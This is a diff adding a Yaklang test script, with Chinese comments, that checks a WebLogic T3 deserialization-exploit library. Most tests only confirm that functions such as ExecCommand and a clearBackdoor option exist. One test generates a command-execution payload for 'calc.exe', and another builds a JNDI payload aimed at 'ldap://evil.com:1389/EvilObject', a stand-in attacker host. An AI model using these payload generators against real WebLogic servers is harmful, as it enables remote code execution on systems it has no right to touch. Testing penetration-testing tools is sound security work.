@@ -1,0 +1,104 @@
+/*
+Yaklang t3 (WebLogic T3协议) 库实践
+
+t3库用于与Oracle WebLogic Server的T3协议进行交互，主要用于反序列化漏洞利用。
+它提供了命令执行、发送Java序列化对象流以及生成JNDI Payload等功能。
+
+关键词: WebLogic T3, 反序列化, 命令执行, JNDI Payload, 漏洞利用
+关键词: t3.ExecCommand, t3.SendJavaObjectStreamBytes, t3.GenerateJavaObjectStreamBytes, t3.GenerateWeblogicJNDIPayload
+关键词: t3.timeout, t3.clearBackdoor, t3.debugHandler
+*/
+
+// 测试ExecCommand函数存在性
+// 关键词: t3.ExecCommand, 命令执行
+func testExecCommand() {
+    log.info("测试ExecCommand函数")
+    
+    assert t3.ExecCommand != undefined, "ExecCommand函数应存在"
+    assert typeof(t3.ExecCommand) == "function", "ExecCommand应为函数类型"
+    
+    log.info("ExecCommand函数存在性验证成功")
+}
+
+// 测试SendJavaObjectStreamBytes函数
+// 关键词: t3.SendJavaObjectStreamBytes, Java序列化流
+func testSendJavaObjectStreamBytes() {
+    log.info("测试SendJavaObjectStreamBytes函数")
+    
+    assert t3.SendJavaObjectStreamBytes != undefined, "SendJavaObjectStreamBytes函数应存在"
+    assert typeof(t3.SendJavaObjectStreamBytes) == "function", "SendJavaObjectStreamBytes应为函数类型"
+    
+    log.info("SendJavaObjectStreamBytes函数存在性验证成功")
+}
+
+// 测试GenerateJavaObjectStreamBytes函数
+// 关键词: t3.GenerateJavaObjectStreamBytes, Payload生成
+func testGenerateJavaObjectStreamBytes() {
+    log.info("测试GenerateJavaObjectStreamBytes函数")
+    
+    assert t3.GenerateJavaObjectStreamBytes != undefined, "GenerateJavaObjectStreamBytes函数应存在"
+    assert typeof(t3.GenerateJavaObjectStreamBytes) == "function", "应为函数类型"
+    
+    // 生成一个命令执行Payload的字节流
+    // 关键词: 命令执行Payload, 字节流
+    cmd = "calc.exe"
+    payloadBytes = t3.GenerateJavaObjectStreamBytes(cmd)
+    assert len(payloadBytes) > 0, "生成的Payload字节流不应为空"
+    log.info(f"GenerateJavaObjectStreamBytes成功生成Payload字节流，长度: ${len(payloadBytes)}字节")
+}
+
+// 测试GenerateWeblogicJNDIPayload函数
+// 关键词: t3.GenerateWeblogicJNDIPayload, JNDI Payload
+func testGenerateWeblogicJNDIPayload() {
+    log.info("测试GenerateWeblogicJNDIPayload函数")
+    
+    assert t3.GenerateWeblogicJNDIPayload != undefined, "GenerateWeblogicJNDIPayload函数应存在"
+    assert typeof(t3.GenerateWeblogicJNDIPayload) == "function", "应为函数类型"
+    
+    // 生成一个JNDI Payload
+    // 关键词: JNDI注入, 远程类加载
+    jndiUrl = "ldap://evil.com:1389/EvilObject"
+    jndiPayloadBytes = t3.GenerateWeblogicJNDIPayload(jndiUrl)
+    assert len(jndiPayloadBytes) > 0, "生成的JNDI Payload不应为空"
+    log.info(f"GenerateWeblogicJNDIPayload成功生成JNDI Payload，长度: ${len(jndiPayloadBytes)}字节")
+}
+
+// 测试配置选项 (timeout, clearBackdoor, debugHandler)
+// 关键词: t3.timeout, t3.clearBackdoor, t3.debugHandler, 配置
+func testConfigurationOptions() {
+    log.info("测试配置选项")
+    
+    assert t3.timeout != undefined, "timeout选项应存在"
+    assert typeof(t3.timeout) == "function", "timeout应为函数类型"
+    log.info("  ✓ timeout选项存在")
+    
+    assert t3.clearBackdoor != undefined, "clearBackdoor选项应存在"
+    assert typeof(t3.clearBackdoor) == "function", "clearBackdoor应为函数类型"
+    log.info("  ✓ clearBackdoor选项存在")
+    
+    assert t3.debugHandler != undefined, "debugHandler选项应存在"
+    assert typeof(t3.debugHandler) == "function", "debugHandler应为函数类型"
+    log.info("  ✓ debugHandler选项存在")
+    
+    log.info("配置选项验证成功")
+}
+
+func main() {
+    log.info("开始Yaklang t3库功能测试")
+    
+    // 基础功能测试
+    testExecCommand()
+    testSendJavaObjectStreamBytes()
+    testGenerateJavaObjectStreamBytes()
+    testGenerateWeblogicJNDIPayload()
+    
+    // 配置选项测试
+    testConfigurationOptions()
+    
+    log.info("t3库功能测试完成")
+    log.info("t3库提供了强大的WebLogic T3协议利用能力，是渗透测试中的重要工具")
+}
+
+// 执行主函数
+main()
+
